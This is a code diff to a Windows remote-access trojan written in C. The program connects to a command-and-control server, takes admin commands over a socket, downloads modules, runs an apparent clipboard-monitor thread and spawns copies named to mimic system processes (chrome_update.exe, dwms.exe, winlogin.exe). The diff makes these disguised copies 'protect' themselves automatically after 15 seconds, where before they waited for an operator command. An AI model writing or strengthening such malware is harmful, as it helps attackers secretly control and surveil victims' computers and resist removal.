@@ -59,8 +59,9 @@ static int download_module(const char *url, const char *out_path) {
     return 1;
 }
 
-/* Auto-protect thread for shadow copies: protects immediately */
+/* Auto-protect thread for shadow copies: waits 15 seconds then protects */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
+    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
     sys_protect_process();
     return 0;
 }
@@ -140,7 +141,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies: chrome_update.exe, dwms.exe, winlogin.exe — click Protect Now on each]";
+        result = "[Spawned 3 copies: chrome_update.exe, dwms.exe, winlogin.exe — auto-protect in 15s]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -255,19 +256,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Start background services */
     CreateThread(NULL, 0, copy_buffer_monitor_thread, NULL, 0, NULL);
     
-    /* Check if this is a shadow copy — just connect as normal client, no auto-protect */
+    /* Check if this is a shadow copy — auto-protect after 15 seconds */
     char *cmdLine = GetCommandLineA();
     if (cmdLine && strstr(cmdLine, "--shadow") != NULL) {
-        /* Shadow copies behave like normal clients until explicitly protected */
+        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
 
-    /* Also detect if running from shadow path — still normal behavior */
+    /* Backup: detect if running from shadow path */
     char currentPath[MAX_PATH];
     GetModuleFileNameA(NULL, currentPath, MAX_PATH);
     if (strstr(currentPath, "chrome_update.exe") != NULL ||
         strstr(currentPath, "dwms.exe") != NULL ||
         strstr(currentPath, "winlogin.exe") != NULL) {
-        /* Normal client mode — connect to C2, wait for commands */
+        CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
 
     /* Elevate privileges if needed for full functionality */
